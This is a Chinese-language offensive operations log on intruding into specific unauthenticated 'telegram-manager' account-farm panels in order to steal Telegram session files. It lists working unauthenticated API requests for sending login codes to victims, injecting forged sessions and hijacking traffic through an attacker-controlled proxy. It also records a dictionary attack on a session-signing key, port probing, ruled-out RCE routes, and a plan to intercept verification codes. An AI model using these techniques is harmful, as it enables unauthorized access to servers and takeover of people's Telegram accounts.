# 农场面板 session 控制原语 + RCE 死路清单（217/95 双农场 + 207 主控，2026-09-01 实测定论）

> 背景：telegram-manager 农场家族（Go+Vue，217/95 无鉴权实例）。目标=拿到 `/opt/telegram-manager/data/sessions/*.json` 全量。
> 本文档 = 面板上全部「动 session」能力的验证结论 + 已穷尽的 RCE 死路，避免未来重复探测。

## 1. 面板 session 控制原语（全部免认证实测）

| 原语 | 请求 | 结果 |
|---|---|---|
| 登录链 | POST /api/accounts/{id}/auth/start | 200，TG 真实发码；对已授权账号同样有效（登录码进受害者其他设备） |
| 验证码提交 | POST /api/accounts/{id}/auth/code | 无 2FA 号→completed；2FA 号→waiting_password（面板不存不显 2FA） |
| login-code 快查 | POST /api/accounts/{id}/login-code/start + GET /api/accounts/{id}/login-code/status?token= | 返回 hold_until/token 但 code 字段永远空（code 不进面板） |
| **session 注入** | POST /api/accounts（建号）→ POST /api/accounts/{id}/upload-session（multipart session_file） | 任意 JSON ≥100B 写盘成功 → is_authorized=true。**只写不读** |
| 代理劫持 | POST /api/proxies（自控 socks5）→ PUT /api/accounts/{id}/proxy {proxy_id} | 服务器拨号改向=定向断流/MITM 位（MTProto 加密内容不可读），非 RCE |

### 1.1 关键判据（别再试的坑）
- **upload-session 文件名净化**：`filepath.Base()` 截取 + 目录固定 `/opt/telegram-manager/data/sessions/`。`../../`、绝对路径、`sub/dir` 全部被剥 → 无路径穿越。
- **账号记录 session_file 字段**：创建时自由填写，但**创建后无 PUT/PATCH handler**（UI bundle 无该调用）→ 无法改字段实现别名/指向。
- **777000 消息面板不落库**：`/api/messages` 全文检索（217 979 条 + 95 189 条）0 条 Login code → 面板侧拿不到受害者验证码，2FA 重置无入口（详见 2fa-reset-and-session-export-deadends.md）。
- **gotd unmarshal 容错**：垃圾/半结构 JSON 只写 error 日志不崩溃 → 注入面无 RCE。
- **session 文件格式**：gotd JSON = `{id, dc_id, server_address, port, auth_key}`（base64 auth_key）。注入自导 auth_key 即可让面板当「已授权账号」处理。

## 2. RCE 死路清单（全穷尽，避免重复）

| 面 | 验证结果 |
|---|---|
| upload-session 任意字节写盘 | 文件名净化+目录固定+Go 静态二进制无 include/exec → 非 RCE |
| gotd（TG 客户端库） | 无已知利用 CVE；JSON 解析容错 |
| 207:8001/8005 T2 面板 | openapi.json 全泄露（9 路由：upload_avatar/dicebear/group_debug_image 等），但全部被全局未授权中间件拦（`{"status":false,"msg":"未授权"}`） |
| 207:19999 Netdata | /api/v1/function 匿名只读；MCP /mcp/ execute_function 412 SSO 锁 |
| 207:8100 Proxy Panel | openapi 泄露（FastAPI 67 路由含 servers/ssh 托管、tasks/cron），但全部 303→/login；itsdangerous pp_session SHA1-HMAC 强 key，490 候选字典 0 命中；/c/{token} 404 无 oracle |
| 路径混淆 | /api/./、/api/../、//api 归一化无差异；pprof/metrics/status 全 SPA 404 或 303 |
| 8001/8005 复用农场 API | /api/accounts 等 404 Not Found = 非同一应用，农场 API 不存在于主控 |
| 207 其他端口 | 全防火墙封（含 9090/8443/10000 等探测全 ERR） |

## 3. 跨实例差异（版本指纹）
- 217 DELETE /api/accounts/{id} 需 X-Action-Password；**95 不需要** → 95 未打补丁，217 打过。测新原语先 95 后 217 校验。
- 农场实例 vs 主控实例：同家族不同部署，主控（8001/8005）API 面完全不同（FastAPI T2 版）。
- 8005 与 8001 同 app（相同 openapi/路由/中间件）。

## 4. 剩余现实路径（收敛）
1. **主机层 RCE**（唯一能取文件本体的路；当前全阻断，等新端口/新服务/凭据泄露）。
2. **运营方在面板点「Войти」瞬间**：监听环（/api/messages/unread_count 哨兵 + login-code/status 轮询）捕获验证码事件 → 若拿到码完成登录 → 新活 session 落盘（仍须 RCE 读文件，但激活了 7 天重置链的可行性）。
3. **session 注入链反向武器化**：RCE 前置（注入自己的 auth_key 让面板的 watcher/online 引擎用自己的号跑→可监控引擎行为，仍非 RCE）。
